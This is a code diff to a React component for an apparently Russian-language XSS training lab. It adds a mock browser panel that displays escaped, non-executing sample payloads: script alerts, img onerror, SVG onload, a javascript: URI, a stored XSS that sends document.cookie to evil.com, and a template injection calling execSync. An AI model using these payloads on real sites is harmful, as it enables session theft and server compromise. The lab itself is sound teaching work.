@@ -132,7 +132,8 @@ export default function XSSLab() {
   const { xssCompletedLevels, addXssLevel, completeModule, setCurrentPage, completedModules } = useAppStore();
   const t = useTranslations('xss');
   const [activeTab, setActiveTab] = useState(xssTypes.length > 0 ? xssTypes[0].id : '');
-  const [showAttacks, setShowAttacks] = useState<Set<string>>(new Set());
+  const [showAttacks, setShowAttacks] = useState<Record<string, boolean>>({});
+  const [attackTriggered, setAttackTriggered] = useState<Record<string, boolean>>({});
 
   const allCompleted = xssCompletedLevels.length === xssTypes.length;
   const isCompleted = completedModules.includes('xss');
@@ -259,18 +260,18 @@ export default function XSSLab() {
                       variant="outline"
                       size="sm"
                       onClick={() => {
-                        const next = new Set(showAttacks);
-                        if (next.has(activeTab)) next.delete(activeTab);
-                        else next.add(activeTab);
-                        setShowAttacks(next);
+                        setShowAttacks((prev) => ({ ...prev, [activeTab]: !prev[activeTab] }));
+                        if (!showAttacks[activeTab]) {
+                          setAttackTriggered((prev) => ({ ...prev, [activeTab]: true }));
+                        }
                       }}
                     >
-                      {showAttacks.has(activeTab) ? 'Скрыть демо' : 'Показать атаку'}
+                    {showAttacks[activeTab] ? 'Скрыть демо' : 'Показать атаку'}
                     </Button>
                   </div>
 
                   <AnimatePresence>
-                    {showAttacks.has(activeTab) && (
+                    {showAttacks[activeTab] && (
                       <motion.div
                         initial={{ opacity: 0, height: 0 }}
                         animate={{ opacity: 1, height: 'auto' }}
@@ -286,7 +287,111 @@ export default function XSSLab() {
 
                           <p className="text-xs text-slate-500">Результат вывода (без защиты):</p>
                           <div className="bg-white rounded-lg p-3 border border-red-200">
-                            <p className="text-[11px] text-red-600 font-medium flex items-center gap-1"><AlertTriangle size={12} /> Код выполнится — пользовательская вставка не обработана</p>
+                            {/* Mock browser window */}
+                            <div className="mb-2 flex items-center gap-2">
+                              <div className="flex gap-1">
+                                <div className="w-2.5 h-2.5 rounded-full bg-red-400"></div>
+                                <div className="w-2.5 h-2.5 rounded-full bg-yellow-400"></div>
+                                <div className="w-2.5 h-2.5 rounded-full bg-green-400"></div>
+                              </div>
+                              <div className="flex-1 bg-slate-100 rounded px-2 py-0.5 text-[10px] text-slate-500 font-mono">
+                                vulnerable-page.example.com
+                              </div>
+                            </div>
+                            {/* Attack result simulation */}
+                            <div className="bg-red-50 rounded p-2 border border-red-100">
+                              {xss.id === 'reflected' && (
+                                <div className="text-xs">
+                                  <p className="text-slate-600 mb-1">Результаты поиска для:</p>
+                                  <p className="font-mono text-red-600 bg-white px-2 py-1 rounded border border-red-200">
+                                    &lt;script&gt;alert("XSS-атака выполнена!")&lt;/script&gt;
+                                  </p>
+                                  <div className="mt-2 p-2 bg-yellow-100 rounded border border-yellow-300 text-yellow-800 text-[11px]">
+                                    ⚠️ Alert: "XSS-атака выполнена!"
+                                  </div>
+                                </div>
+                              )}
+                              {xss.id === 'stored' && (
+                                <div className="text-xs">
+                                  <p className="text-slate-600 mb-1">Комментарии:</p>
+                                  <div className="bg-white p-2 rounded border border-red-200">
+                                    <p className="text-slate-700">Пользователь:</p>
+                                    <p className="font-mono text-red-600 text-[11px]">
+                                      &lt;script&gt;document.location="https://evil.com/steal?cookie="+document.cookie&lt;/script&gt;
+                                    </p>
+                                  </div>
+                                  <div className="mt-2 p-2 bg-red-100 rounded border border-red-300 text-red-800 text-[11px]">
+                                    🔴 Куки отправлены на https://evil.com/steal
+                                  </div>
+                                </div>
+                              )}
+                              {xss.id === 'dom' && (
+                                <div className="text-xs">
+                                  <p className="text-slate-600 mb-1">Страница приветствия:</p>
+                                  <div className="bg-white p-2 rounded border border-red-200">
+                                    <p className="text-slate-700">Добро пожаловать, </p>
+                                    <p className="font-mono text-red-600 text-[11px]">
+                                      #&lt;img src=x onerror="document.body.style.background='red'"&gt;
+                                    </p>
+                                  </div>
+                                  <div className="mt-2 p-2 bg-red-100 rounded border border-red-300 text-red-800 text-[11px]">
+                                    🔴 Фон страницы изменён на красный
+                                  </div>
+                                </div>
+                              )}
+                              {xss.id === 'event-handler' && (
+                                <div className="text-xs">
+                                  <p className="text-slate-600 mb-1">Изображение:</p>
+                                  <div className="bg-white p-2 rounded border border-red-200">
+                                    <code className="text-[11px] text-red-600">
+                                      &lt;img src="x onerror=..."&gt;
+                                    </code>
+                                  </div>
+                                  <div className="mt-2 p-2 bg-yellow-100 rounded border border-yellow-300 text-yellow-800 text-[11px]">
+                                    ⚠️ Alert: "XSS через onerror"
+                                  </div>
+                                </div>
+                              )}
+                              {xss.id === 'svg' && (
+                                <div className="text-xs">
+                                  <p className="text-slate-600 mb-1">SVG контент:</p>
+                                  <div className="bg-white p-2 rounded border border-red-200">
+                                    <code className="text-[11px] text-red-600">
+                                      &lt;svg onload="alert('XSS через SVG')"&gt;
+                                    </code>
+                                  </div>
+                                  <div className="mt-2 p-2 bg-yellow-100 rounded border border-yellow-300 text-yellow-800 text-[11px]">
+                                    ⚠️ Alert: "XSS через SVG"
+                                  </div>
+                                </div>
+                              )}
+                              {xss.id === 'data-uri' && (
+                                <div className="text-xs">
+                                  <p className="text-slate-600 mb-1">Ссылка:</p>
+                                  <div className="bg-white p-2 rounded border border-red-200">
+                                    <code className="text-[11px] text-red-600">
+                                      javascript:alert('XSS через javascript:')
+                                    </code>
+                                  </div>
+                                  <div className="mt-2 p-2 bg-yellow-100 rounded border border-yellow-300 text-yellow-800 text-[11px]">
+                                    ⚠️ Alert: "XSS через javascript:"
+                                  </div>
+                                </div>
+                              )}
+                              {xss.id === 'template-injection' && (
+                                <div className="text-xs">
+                                  <p className="text-slate-600 mb-1">Приветствие:</p>
+                                  <div className="bg-white p-2 rounded border border-red-200">
+                                    <code className="text-[11px] text-red-600">
+                                      &lt;%= process.mainModule.require("child_process").execSync("whoami") %&gt;
+                                    </code>
+                                  </div>
+                                  <div className="mt-2 p-2 bg-red-100 rounded border border-red-300 text-red-800 text-[11px]">
+                                    🔴 Выполнена команда: root (сервер скомпрометирован)
+                                  </div>
+                                </div>
+                              )}
+                            </div>
                           </div>
 
                           <p className="text-xs text-slate-500">Применённая защита:</p>
